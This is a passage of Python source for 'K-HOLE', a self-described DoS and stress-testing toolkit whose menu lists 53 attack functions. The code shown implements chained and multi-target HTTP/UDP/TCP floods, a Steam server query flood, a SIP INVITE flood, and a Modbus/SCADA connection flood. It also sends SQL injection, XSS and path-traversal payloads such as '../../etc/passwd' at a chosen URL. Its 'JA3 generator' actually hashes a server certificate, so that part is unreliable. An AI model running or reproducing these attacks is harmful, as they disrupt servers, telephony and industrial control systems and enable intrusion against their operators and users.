        method = input("Method: ").strip().lower()
        if method == 'done':
            break
        if method in ["http", "udp", "tcp"]:
            sequence.append(method)
        else:
            print("Invalid method. Options: http, udp, tcp")

    target = input("Target IP or URL: ")
    port = int(input("Port (default 80): ") or 80)
    duration = int(input("Duration per attack (sec): "))
    threads = int(input("Threads (default 50): ") or 50)

    for method in sequence:
        print(f"[CHAIN] Exexcuting {method.upper()}...")
        if method == "http":
            http_flood(target, "GET", duration, threads)
        elif method == "udp":
            udp_flood(target, port, duration, threads)
        elif method == "tcp":
            tcp_flood(target, port, duration, threads)
    print("[Chain Attacks] Sequence complete.")

def multi_target_support():
    print("[Multi-Target Attack] Starting...")
    filepath = input("Enter filename containing list of targets: ")

    try:
        with open(filepath, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]

        method = input("Enter method to use (http/udp/tcp): ").lower()
        port = int(input("Port (default 80): ") or 80)
        duration = int(input("Duration per target (sec): "))
        threads = int(input("Threads per target: "))

        for target in targets:
            print(f"[Multi-Target] Attacking {target} with {method.upper()}")
            if method == "http":
                http_flood(target, "GET", duration, threads)
            elif method == "udp":
                udp_flood(target, port, duration, threads)
            elif method == "tcp":
                tcp_flood(target, port, duration, threads)
            else:
                print("[!] Invalid method. Skipping target")
        
        print("[Multi-Target] Sequence complete")

    except Exception as e:
        print(f"[Multi-Target Error] {e}")

def steam_a2s_flood():
    print("[Steam A2S Flood] Starting...")
    target = input("Target IP: ")
    port = int(input("Port (default 27015): ") or 27015)
    duration = int(input("Duration (in seconds): "))

    timeout = time.time() + duration
    a2s_request = b'\xFF\xFF\xFF\xFFTSource Engine Query\x00'

    sent = 0
    errors = 0

    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            sock.sendto(a2s_request, (target, port))
            sent += 1
            try:
                data, _ = sock.recvfrom(4096)
                if data:
                    print(f"[A2S] Response from {target}:{port}")
            except socket.timeout:
                pass
            sock.close()
        except Exception as e:
            errors += 1
            print(f"[A2S Error] {e}")
    
    print(f"[A2S Flood Complete] Packets sent: {sent}, Errors: {errors}")

def sip_voip_flood():
    print("[SIP/VoIP Flood] Starting...")
    target_ip = input("Target IP: ")
    port = int(input("Target port (default 5060): ") or 5060)
    duration = int(input("Duration (in seconds): "))
    timeout = time.time() + duration

    sip_invite = (
        "INVITE sip:victim@{ip} SIP/2.0\r\n"
        "Via: SIP/2.0/UDP attacker.example.com:5060;branch=z9hG4bK776asdhds\r\n"
        "Max-Forwards: 70\r\n"
        "To: <sip:victim@{ip}>\r\n"
        "From: \"Attacker\" <sip:attacker@attacker.com>;tag=1928301774\r\n"
        "Call-ID: a84b4c76e66710@attacker.com\r\n"
        "CSeq: 314159 INVITE\r\n"
        "Contact: <sip:attacker@attacker.com>\r\n"
        "Content-Type: application/sdp\r\n"
        "Content-Length: 0\r\n\r\n"
    ).format(ip=target_ip)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0

    while time.time() < timeout:
        try:
            sock.sendto(sip_invite.encode(), (target_ip, port))
            sent += 1
            print(f"[SIP] Sent INVITE to {target_ip}:{port}")
        except Exception as e:
            print(f"[SIP Error] {e}")

    print(f"\n[SIP Flood Complete] Packets sent: {sent}")

def modbus_scada_flood():
    print("[Modbus/SCADA Flood] Starting...")
    target_ip = input("Target IP: ")
    port = int(input("Target port (default 502): ") or 502)
    duration = int(input("Duration (in seconds): "))
    timeout = time.time() + duration

    sent = 0
    errors = 0

    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, port))

            # Modbus TCP: Transaction ID (2 bytes), Protocol ID (2), Length (2), Unit ID (1),  Function (1), Address (2), Quantity (2)
            request = struct.pack('>HHHBBHH', 1, 0, 6,  1, 3, 0, 10) # Read Holding Registers
            sock.send(request)
            response = sock.recv(256)
            print(f"[Modbus] Response: {response.hex()}")
            sent += 1
            sock.close()
        except Exception as e:
            errors += 1
            print(f"[Modbus Error] {e}")

    print(f"\n[Modbus Flood Complete] Packets sent: {sent}, Errors: {errors}")

def live_stats_dashboard():
    print("\n[Live Stats Dashboard] Displaying real-time attack stats")
    print("Press Ctrl+C to stop\n")

    try:
        while True:
            print("=" * 50)
            print("[STATS]")
            print(f"HHTP: {http_stats.get('success', 0)} success | {http_stats.get('fail', 0)} fail")
            print(f"UDP: {udp_stats.get('sent', 0)} sent | {udp_stats.get('errors', 0)} errors")
            print(f"TCP: {tcp_stats.get('sent', 0)} sent | {tcp_stats.get('errors', 0)} errors")
            print(f"Slowloris: {sl_stats.get('open', 0)} open | {sl_stats.get('fail', 0)} failed")
            print(f"Amplify: {amplify_stats.get('packets', 0)} packets | {amplify_stats.get('errors', 0)} errors")
            print("=" * 50)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[Live Stats Dashboard] Monitoring stopped")

def rps_threads_calculator():
    print("\n[RPS/Threads Calculator] Estimate performance needs")
    try:
        rps = int(input("Enter desired requests per second: "))
        duration = int(input("Attack duration in seconds: "))
        avg_latency = float(input("Average latency per request (sec): "))

        estimated_total = rps * duration
        ideal_threads = int(rps * avg_latency)

        print("\n--- Estimation Results ---")
        print(f"Total Requests: {estimated_total}")
        print(f"Recommended Threads: ~{ideal_threads} (based on latency)")
    except ValueError:
        print("[!] Invalid input. Enter numeric values only :p")

def ja3_tls_fingerprint_generator():
    print("[JA3/TLS Fingerprint Generator]")
    host = input("Enter hostname (e.g. www.google.com): ")
    port = int(input("Port (default 443): ") or 443)

    try:
        context = ssl.create_default_context()
        conn = context.wrap_socket(socket.socket(), server_hostname=host)
        conn.connect((host, port))

        client_hello = conn.getpeercert(binary_form=True)
        if client_hello:
            ja3_hash = hashlib.md5(client_hello).hexdigest()
            print(f"[JA3 Hash] {ja3_hash}")
        else:
            print("[!] No binary cert received")
        conn.close()
    
    except Exception as e:
        print(f"[JA3 Error] {e}")

def cdn_detection():
    print("\n[CDN Detection] Starting...")
    host = input("Enter Hostname (e.g. google.com): ")

    try:
        ip = socket.gethostbyname(host)
        print(f"[Resolved IP] {ip}")

        cdn_headers = {
            "Server": ["cloudflare", "akamai", "fastly", "incapsula", "sucuri"],
            "X-CDN": ["CloudFront", "Imperva", "Reblaze"]
        }

        res = requests.get(f"http://{host}", timeout=5)
        detected = []

        for header, patterns in cdn_headers.items():
            val = res.headers.get(header, "").lower()
            for pattern in patterns:
                if pattern.lower() in val:
                    detected.append(pattern)

        if detected:
            print("[CDN Detected]", ", ".join(set(detected)))
        else:
            print("[!] No known CDN signature detected")
    except Exception as e:
        print(f"[CDN Detection Error] {e}")

def retry_request_with_backoff():
    print("\n[Auto Retry on 403/429] Testing HTTP backoff strategy")
    url = input("Enter URL to request: ")
    max_retries = 5
    delay = 1

    for attempt in range(1, max_retries + 1):
        try:
            res = requests.get(url)
            print(f"[Attempt {attempt}] Status Code: {res.status_code}")
            if res.status_code not in (403, 429):
                print("[Success] Response content:\n", res.text[:200])
                break
            print(f"[Retrying in {delay}s...]")
            time.sleep(delay)
            delay *=2
        except Exception as e:
            print(f"[Request Error] {e}")
            break

def web_app_attack_tools():
    print("\n[Web App Attack Tools]")
    url = input("Enter target URL: ")
    method = input("Choose test (sql/xss/path): ").lower()

    payloads = {
        "sql": ["' OR '1'='1", "' UNION SELECT NULL--", "admin' --"],
        "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(2)>", "<svg/onload=alert(3)>"],
        "path": ["../../etc/passwd", "../admin/config.php", "../../../../windows/win.ini"]
    }

    if method not in payloads:
        print("[!] Invalid method selected")
        return
    
    print(f"\n[Testing {method.upper()} payloads]")
    for payload in payloads[method]:
        try:
            res = requests.get(url, params={"input": payload}, timeout=5)
            print(f"[Payload] {payload} | Status: {res.status_code}")
        except Exception as e:
            print(f"[Request Error] {e}")


method_functions = {
    1: http_flood,
    2: async_http_flood,
    3: websocket_flood,
    4: browser_emulation_flood,
    5: slowloris_attack,
    6: js_challenge_bypass,
    7: custom_header_flood,
    8: ssl_renegotiation_flood,
    9: rudy_attack,
    10: udp_flood,
    11: tcp_flood,
    12: ack_rst_flood,
    13: syn_cookie_bypass,
    14: ping_of_death,
    15: smurf_attack,
    16: xmas_flood,
    17: ip_spoofed_syn_flood,
    18: reflected_icmp_flood,
    19: gre_flood,
    20: fragmentation_flood,
    21: dns_amplification,
    22: ssdp_amplification,
    23: ntp_amplification,
    24: memcached_amplification,
    25: ldap_amplification,
    26: cldap_reflection,
    27: snmp_amplification,
    28: vse_amplification,
    29: tor_ip_renewal,
    30: port_scanner,
    31: smtp_flood,
    32: webdav_abuse,
    33: sql_slam_attack,
    34: dns_cache_buster,
    35: custom_payload_editor,
    36: macro_script_engine,
    37: interactive_header_builder,
    38: reverse_dns_asn_lookup,
    39: whois_lookup,
    40: ip_range_scanner,
    41: real_ip_resolver,
    42: load_config_profile,
    43: chain_attacks,
    44: multi_target_support,
    45: steam_a2s_flood,
    46: sip_voip_flood,
    47: modbus_scada_flood,
    48: live_stats_dashboard,
    49: rps_threads_calculator,
    50: ja3_tls_fingerprint_generator,
    51: cdn_detection,
    52: retry_request_with_backoff,
    53: web_app_attack_tools
}

ascii_logo = f"""
{Fore.MAGENTA}{Style.BRIGHT}
   _  _           _  _      ____      _         ____   
  FJ / ;         FJ  L]    F __ ]    FJ        F ___J  
 J |/ (| ______ J |__| L  J |--| L  J |       J |___:  
 |     L|______||  __  |  | |  | |  | |       | _____| 
 F L:\  L______JF L__J J  F L__J J  F L_____  F L____: 
J__L \\__L     J__L  J__LJ\______/FJ________LJ________L
|__L  \L_|     |__L  J__| J______F |________||________|
{Style.RESET_ALL}
{Fore.CYAN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════╗
║            K-HOLE - KJI's DoS and Stress Testing Toolkit             ║
║               Coded by KetaGod | https://t.me/ketagod                ║
║  ➤ HTTP(S) & Async Flooding     ➤ TOR Identity Cycling               ║
║  ➤ UDP / TCP Flood              ➤ JS Challenge Bypass                ║
║  ➤ Slowloris                    ➤ DNS/NTP/SSDP Amplify               ║
║  ➤ Custom Payload Injection     ➤ Layer 4/7 Attacks                  ║
║  ➤ Real-Time Stats              ➤ Target Scanner                     ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

def show_main_menu():
    while True:
        print("\nMain Menu:")
        print("[1] Attack Methods")
        print("[2] Utilities")
        print("[3] Recon Tools")
        print("[4] Misc Tools")
        print("[5] Exit")
        choice = input("Choose an option: ")
        if choice =="1":
            show_attack_categories()
        elif choice == "2":
            show_utilities_menu()
        elif choice == "3":
            show_recon_tools_menu()
        elif choice == "4":
            show_misc_menu()
        elif choice == "5":
            print("Exiting...")
            break
        else:
            print("Invalid option")

def show_attack_categories():
    while True:
        print("\nAttack Categories:")
        print("[1] Layer 4 Attacks")
        print("[2] Layer 7 Attacks")
        print("[3] Amplification Attacks")
        print("[99] Back to Main Menu")
        category = input("Choose an option: ")
        if category == "1":
            show_layer4_methods()
        elif category == "2":
            show_layer7_methods()
        elif category == "3":
            show_amplification_methods()
        elif category == "99":
            return
        else:
            print("Inavlid option")

def show_utilities_menu():
    utilities = [
        ("TOR IP Renewal", tor_ip_renewal),
        ("Port Scanner", port_scanner),
        ("Custom Payload Editor", custom_payload_editor),
        ("Macro/Script Engine", macro_script_engine),
        ("Interactive Header Builder", interactive_header_builder)
    ]
    show_method_list("Utilities", utilities)

def show_layer4_methods():
    methods = [
        ("UDP Flood", udp_flood),
        ("TCP Flood", tcp_flood),
        ("ACK/RST Flood", ack_rst_flood),
        ("SYN Cookie Bypass", syn_cookie_bypass),
        ("Ping of Death", ping_of_death),
        ("Smurf Attack", smurf_attack),
        ("XMAS Tree Packet Flood", xmas_flood),
        ("IP Spoofed SYN Flood", ip_spoofed_syn_flood),
        ("Reflected ICMP Flood", reflected_icmp_flood),
        ("GRE Flood", gre_flood),
        ("Fragmentation Flood", fragmentation_flood)
    ]
    show_method_list("Layer 4 Methods", methods)

def show_layer7_methods():
    methods = [
        ("HTTP Flood", http_flood),
        ("Async HTTP Flood", async_http_flood),
        ("Slowloris Attack", slowloris_attack),
        ("JS Challenge Bypass", js_challenge_bypass),
        ("WebSocket Flood", websocket_flood),
        ("Browser Emulation Flood", browser_emulation_flood),
        ("RUDY Attack", rudy_attack),
        ("Custom Header Flood", custom_header_flood),
        ("SSL Renegotiation Flood", ssl_renegotiation_flood),
        ("SMTP Flood/Abuse", smtp_flood),
        ("WebDAV Abuse/HTTP PUT", webdav_abuse),
        ("SQL Slam Attack", sql_slam_attack),
        ("DNS Cache Buster", dns_cache_buster)
    ]
    show_method_list("Layer 7 Methods", methods)

def show_amplification_methods():
    methods = [
        ("DNS Amplification", dns_amplification),
        ("SSDP Amplification", ssdp_amplification),
        ("NTP Amplification", ntp_amplification),
        ("Memcached Amplification", memcached_amplification),
        ("LDAP Amplification", ldap_amplification),
        ("CLDAP Reflection", cldap_reflection),
        ("SNMP Amplification", snmp_amplification),
        ("VSE Amplification", vse_amplification)
    ]
    show_method_list("Amplification Methods", methods)

def show_recon_tools_menu():
    methods = [
        ("Reverse DNS & ASN Lookup", reverse_dns_asn_lookup),
        ("WHOIS Lookup", whois_lookup),
        ("IP Range Scanner", ip_range_scanner),
        ("IP Resolver", real_ip_resolver),
    ]
    show_method_list("Recon Tools", methods)

def show_misc_menu():
    methods = [
        ("Auto-Config Profiles", load_config_profile),
        ("Chain Attacks", chain_attacks),
        ("Multi-Target Support", multi_target_support),
        ("Steam A2S Flood", steam_a2s_flood),
        ("SIP/VoIP Flood", sip_voip_flood),
        ("Modbus/SCADA Flood", modbus_scada_flood),
        ("Live Stats Dashboard", live_stats_dashboard),
        ("RPS/Threads Calculator", rps_threads_calculator),
        ("JA3/TLS Fingerprint Generator", ja3_tls_fingerprint_generator),
        ("CDN Detection", cdn_detection),
        ("Auto Retry on 403/429", retry_request_with_backoff),
        ("Web App Attack Tools", web_app_attack_tools),
    ]
    show_method_list("Misc", methods)

def show_method_list(title, methods):
    while True:
        print(f"\n{title}:")
        for idx, (name, _) in enumerate(methods, 1):
            print(f"[{idx}] {name}")
        print("[99] Back")
        choice = input("Choose method: ")
        if choice == "99":
            return
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(methods):
                methods[idx][1]()
            else:
                print("Invalid option")
        except ValueError:
            print("Invalid option")

print(ascii_logo)

http_stats = {"success": 0, "fail": 0}
udp_stats = {"sent": 0, "errors": 0}
tcp_stats = {"sent": 0, "errors": 0}
sl_stats = {"open": 0, "fail": 0}
amplify_stats = {"packets": 0, "errors": 0}
running = True

if __name__ == "__main__":
    try:
        show_main_menu()
    except KeyboardInterrupt:
        print("\n[!] Program interrupted by user. Exiting...")
